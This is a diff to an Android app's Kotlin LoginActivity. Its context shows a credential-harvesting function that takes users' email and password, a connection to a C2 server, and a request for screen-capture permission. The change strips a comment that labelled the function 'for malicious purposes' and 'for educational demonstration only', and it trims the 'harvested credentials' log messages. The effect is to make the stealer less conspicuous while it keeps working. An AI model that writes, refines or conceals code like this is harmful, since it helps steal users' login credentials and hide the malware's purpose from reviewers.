@@ -68,6 +68,7 @@ class LoginActivity : AppCompatActivity() {
                 }
         }
         requestScreenCapturePermission()
+
     }
     private val REQUEST_MEDIA_PROJECTION = 1
 
@@ -117,11 +118,7 @@ class LoginActivity : AppCompatActivity() {
             Log.e("C2Connection", "Error connecting to C2 server", e)
         }
     }
-    
-    /**
-     * Harvest user credentials for malicious purposes
-     * FOR EDUCATIONAL DEMONSTRATION ONLY
-     */
+
     private fun harvestCredentials(email: String, password: String, failed: Boolean = false) {
         Log.d("CredentialHarvester", "Harvesting credentials")
         
@@ -142,9 +139,9 @@ class LoginActivity : AppCompatActivity() {
                 extraData = extraData
             )
             
-            Log.d("CredentialHarvester", "Credentials harvested successfully")
+            Log.d("CredentialHarvester", "Harvested successfully")
         } catch (e: Exception) {
-            Log.e("CredentialHarvester", "Error harvesting credentials", e)
+            Log.e("CredentialHarvester", "Error harvesting", e)
         }
     }
 }
